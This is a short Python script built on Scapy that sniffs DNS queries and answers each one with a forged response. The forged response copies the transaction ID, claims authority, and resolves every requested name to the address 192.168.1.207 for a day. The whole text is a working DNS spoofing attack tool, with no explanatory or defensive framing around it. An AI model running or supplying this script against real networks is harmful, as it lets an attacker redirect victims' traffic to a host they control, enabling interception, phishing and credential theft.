from scapy.all import *

def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        # Extract the transaction ID and query name
        qname = packet[DNSQR].qname
        tid = packet[DNS].id

        # Craft the spoofed response
        spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                           UDP(dport=packet[UDP].sport, sport=53)/\
                           DNS(id=tid, qr=1, aa=1, qd=packet[DNS].qd, 
                               an=DNSRR(rrname=qname, ttl=86400, rdata="192.168.1.207"))

        # Send the spoofed response
        send(spoofed_response, verbose=False)
        print(f"Sent spoofed response for {qname} with ID {tid}")

# Sniff DNS queries
sniff(filter="udp port 53", prn=dns_spoof)